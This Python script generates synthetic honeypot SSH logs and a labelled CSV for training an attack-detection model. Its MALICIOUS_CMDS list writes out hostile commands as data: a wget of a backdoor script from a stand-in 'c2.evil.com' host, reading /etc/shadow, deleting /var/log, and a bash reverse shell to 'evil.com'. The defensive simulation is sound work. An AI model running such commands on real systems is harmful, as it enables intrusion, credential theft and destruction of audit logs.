"""
Sample Data Generator
======================
Generates realistic sample honeypot JSON logs and processed CSV
so you can run the dashboard and ML model WITHOUT needing a live
honeypot session first.

Run: python src/generate_sample_data.py
"""

import json
import os
import random
import csv
from datetime import datetime, timedelta

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_FILE = os.path.join(BASE_DIR, "data", "honeypot_logs.json")
CSV_FILE = os.path.join(BASE_DIR, "data", "processed_logs.csv")

os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)

FAKE_IPS = [
    "45.33.32.156", "194.165.16.11", "89.248.167.131",
    "198.20.70.114", "103.21.244.0", "185.220.101.45",
    "162.247.74.201", "77.247.181.162", "171.25.193.20",
    "192.168.1.55",   # local attacker
]

USERNAMES = ["root","admin","ubuntu","pi","oracle","test","deploy","git","user","postgres"]
PASSWORDS = ["123456","password","admin","root","letmein","qwerty","abc123","toor","alpine","1234"]
MALICIOUS_CMDS = ["wget http://c2.evil.com/backdoor.sh","chmod +x backdoor.sh","./backdoor.sh",
                   "crontab -e","cat /etc/shadow","rm -rf /var/log","bash -i >& /dev/tcp/evil.com/4444 0>&1"]
RECON_CMDS = ["whoami","id","uname -a","ls","pwd","ifconfig","cat /etc/passwd","history"]

def random_timestamp(days_back=7):
    dt = datetime.utcnow() - timedelta(
        days=random.uniform(0, days_back),
        hours=random.uniform(0, 23),
        minutes=random.uniform(0, 59),
    )
    return dt.isoformat()

def label(attempts, cmd_count, has_mal, duration):
    if has_mal or (attempts >= 5 and cmd_count > 3 and duration > 30):
        return "Malicious"
    if attempts >= 3 or cmd_count >= 1:
        return "Suspicious"
    return "Normal"

logs = []
csv_rows = []

for i in range(120):
    ip          = random.choice(FAKE_IPS)
    username    = random.choice(USERNAMES)
    password    = random.choice(PASSWORDS)
    attempts    = random.randint(1, 12)
    is_session  = attempts >= 3
    cmds        = []

    if is_session:
        n_recon = random.randint(0, 5)
        n_mal   = random.randint(0, 3) if attempts > 5 else 0
        cmds    = random.sample(RECON_CMDS, min(n_recon, len(RECON_CMDS))) + \
                  random.sample(MALICIOUS_CMDS, min(n_mal, len(MALICIOUS_CMDS)))
        random.shuffle(cmds)

    duration    = random.uniform(0, 5) if not is_session else random.uniform(5, 180)
    has_mal_cmd = int(any(c in MALICIOUS_CMDS for c in cmds))
    ts          = random_timestamp()

    log_entry = {
        "timestamp"       : ts,
        "ip"              : ip,
        "event"           : "session" if is_session else "auth_attempt",
        "username"        : username,
        "password"        : password,
        "login_attempts"  : attempts,
        "commands"        : cmds,
        "command_count"   : len(cmds),
        "session_duration": round(duration, 2),
    }
    logs.append(log_entry)

    lbl = label(attempts, len(cmds), has_mal_cmd, duration)
    csv_rows.append({
        "timestamp"        : ts,
        "ip"               : ip,
        "username"         : username,
        "password"         : password,
        "login_attempts"   : attempts,
        "command_count"    : len(cmds),
        "session_duration" : round(duration, 2),
        "has_malicious_cmd": has_mal_cmd,
        "label"            : lbl,
    })

# Write JSON
with open(LOG_FILE, "w") as f:
    json.dump(logs, f, indent=2)

# Write CSV
fieldnames = ["timestamp","ip","username","password","login_attempts",
              "command_count","session_duration","has_malicious_cmd","label"]
with open(CSV_FILE, "w", newline="") as f:
    writer = csv.DictWriter(f, fieldnames=fieldnames)
    writer.writeheader()
    writer.writerows(csv_rows)

print(f"[✓] Generated {len(logs)} log entries → {LOG_FILE}")
print(f"[✓] Generated {len(csv_rows)} CSV rows → {CSV_FILE}")
print(f"\n  Label distribution:")
from collections import Counter
counts = Counter(r["label"] for r in csv_rows)
for lbl, cnt in counts.items():
    print(f"    {lbl}: {cnt}")
print("\n[→] Now run: python src/train_model.py")
